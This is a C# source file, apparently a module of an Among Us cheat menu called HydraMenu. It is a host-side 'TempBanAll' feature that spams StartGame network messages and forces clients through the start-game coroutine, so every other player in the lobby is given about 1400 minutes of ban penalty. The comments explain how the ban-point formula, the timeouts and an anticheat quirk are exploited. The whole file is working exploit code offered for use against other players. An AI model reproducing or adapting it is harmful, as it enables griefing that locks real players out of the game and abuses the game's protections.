using AmongUs.GameOptions;
using BepInEx.Unity.IL2CPP.Utils.Collections;
using HarmonyLib;
using HydraMenu.network;
using InnerNet;
using System.Collections;
using UnityEngine;
using UnityEngine.ResourceManagement.AsyncOperations;

namespace HydraMenu.modules.host
{
	internal class TempBanAll : Module
	{
		public TempBanAll() : base("TempBanAll") { }

		private static TempBanAll Instance
		{
			get { return ModuleManager.tempBanAll; }
		}

		// Each time the game starts all players are given one ban point
		// To determine the amount of ban minutes that can be awarded, the formula B = (g - 2) * 5 can be used
		// where B is the number of ban minutes, and g is the amount of games that have started
		// If we start the game 282 times, each player will be banned for 1400 minutes
		// The PlayerBanData::get_BanMinutesLeft function has a cap of 1440 ban minutes, so we have to be careful not to exceed that
		// We give 40 minute leeway just incase some players already have ban point awarded to them
		private readonly int START_GAME_COUNT = 282;

		// A problem that plagued Among Us is players leaving games due to them not getting the role they wanted
		// Innersloth added a protection against this by adding penalties to disconnections
		// Each client keeps track of a ban points value. Every time the game starts, you are awarded one ban point, when you die you lose one ban point, and when the game ends you lose 1.5 ban points
		// If you have more than two ban points, then you are blocked from joining any games until the penalty is up
		// We can abuse this disconnection penalty by repeatedly starting the game, which will result in players getting awarded a large number of ban points
		// and thus being banned for long periods of time
		private IEnumerator Run()
		{
			// Normally the client timeout for spawning in the map is fifteen seconds
			// however if the map ID in CurrentGameOptions is set to Airship or Fungle, then the timeout is increased to twenty seconds
			// We do not actually need to spawn in an Airship or Fungle ShipStatus, we just need to set it in the game options
			// Setting the map ID to Fungle gives five additional seconds for all clients to handle all the start game messages
			IGameOptions gameOptions = GameOptions.CreateCloneOptions(GameManager.Instance.LogicOptions.currentGameOptions);
			gameOptions.SetByte(ByteOptionNames.MapId, (byte)MapNames.Fungle);
			GameOptions.SendGameOptionsToClient(gameOptions, -1);

			// The AmongUsClient::CoStartGame coroutine is responsible for awarding ban points. This function is called every time the client receives the StartGame root message
			// By spamming the StartGame root message, we can make the client run this coroutine many times at once, which will each award the player one ban point
			for(int i = 0; i < START_GAME_COUNT; i++)
			{
				AmongUsClient.Instance.SendStartGame();
			}

			// The AmongUsClient::CoStartGame coroutine does a lot of things, and waits for a lot of events, before awarding any ban points
			// AmongUsClient::CoStartGame runs and awaits the AmongUsClient::CoStartGameClient or AmongUsClient::CoStartGameHost coroutines, depending on if the client is the host of the lobby or not
			// AmongUsClient::CoStartGameClient first waits for the host to despawn the lobby and spawn in an instance of the map within fifteen or twenty seconds
			// If the timer is up and none of those criteria have been met, then the client disconnects
			// Otherwise, the client sends a ClientReady game message to notify the host that it has loaded in the map
			// The client then waits for all other players to send the ClientReady game message within the same time period as before
			// If not all clients have readied up by the timer, then the client disconnects
			// Otherwise, the client then waits for tasks and a role to be assigned to the player. This has no associated timeout.
			// Once all of these checks are done, the AmongUsClient::CoStartGameClient finishes and returns execution back to AmongUsClient::CoStartGame
			// Afterwards, the AmongUsClient::CoStartGame coroutine finally awards a ban point to the player
			// To get the AmongUsClient::CoStartGameClient coroutine to finish as fast as possible, we immediately despawn the lobby, spawn in a map, and assign tasks and roles to all players
			// Since we have sent 282 StartGame game messages, there are 282 AmongUsClient::CoStartGame coroutines running all at the same time
			// which will all award one ban point to the player
			BatchedMessage batch = new BatchedMessage();

			if(LobbyBehaviour.Instance != null)
			{
				batch.QueueDespawn(LobbyBehaviour.Instance);
			}

			if(ShipStatus.Instance == null)
			{
				AsyncOperationHandle<GameObject> asyncHandle = AmongUsClient.Instance.ShipPrefabs[0].InstantiateAsync(null, false);
				yield return asyncHandle;

				ShipStatus ship = asyncHandle.Result.GetComponent<ShipStatus>();
				batch.QueueSpawn(ship, -2, SpawnFlags.None);
			}

			foreach(PlayerControl player in PlayerControl.AllPlayerControls)
			{
				// To avoid the intro cutscene from showing up for ourselves, do not assign our player roles or tasks
				// We do not want the intro cutscene to show as otherwise the game will be marked as having started, and GameManager::FixedUpdate will request the game to end
				// The game ending will result in the temp ban process being interrupted, and players not being awarded any ban points
				if(player == PlayerControl.LocalPlayer || player.Data == null) continue;

				if(!player.roleAssigned)
				{
					batch.QueueSetRole(player, RoleTypes.Crewmate);
				}

				if(player.myTasks.Count == 0)
				{
					batch.QueueSetTasks(player.Data, [0]);
				}
			}

			// Something weird about the Innersloth anticheat is that it will kick you if you include a ClientReady game message in a batch with other game messages
			// except if the ClientReady is the last message in the batch
			ClientData myClient = AmongUsClient.Instance.FindClientById(AmongUsClient.Instance.ClientId);
			if(!myClient.IsReady)
			{
				batch.QueueClientReady(myClient);
			}

			batch.FinishBatch();

			Enabled = false;
		}

		// Don't allow CoStartGame to run for ourselves!!!
		// Our client will run the AmongUsClient::CoStartGame coroutine 282 times, which will run AmongUsClient::CoStartGameHost 282 times
		// which will mean 282 instances of The Skeld will spawn, and each player will be assigned roles and tasks 282 times
		// We will also log a lot of messages to the console, which can cause lag and inhibit the temp ban process from completing in time
		[HarmonyPatch(typeof(AmongUsClient._CoStartGame_d__32), nameof(AmongUsClient._CoStartGame_d__32.MoveNext))]
		class BlockGameStart
		{
			static bool Prefix()
			{
				return !Instance.Enabled;
			}
		}

		// Fallback incase an error is thrown in the Run coroutine and the enabled state is not set to false
		private void OnDisconnect()
		{
			Enabled = false;
		}

		protected override void OnEnable()
		{
			// This should not be run when the config loads
			if(AmongUsClient.Instance == null)
			{
				_enabled = false;
			}

			if(!AmongUsClient.Instance.AmHost)
			{
				Hydra.notifications.Send("Temp Ban All", "You need to be the host of the lobby in order to use this feature.");
				Enabled = false;
				return;
			}

			EventCoordinator.OnDisconnect += OnDisconnect;

			AmongUsClient.Instance.StartCoroutine(Run().WrapToIl2Cpp());
		}

		protected override void OnDisable()
		{
			EventCoordinator.OnDisconnect -= OnDisconnect;
		}
	}
}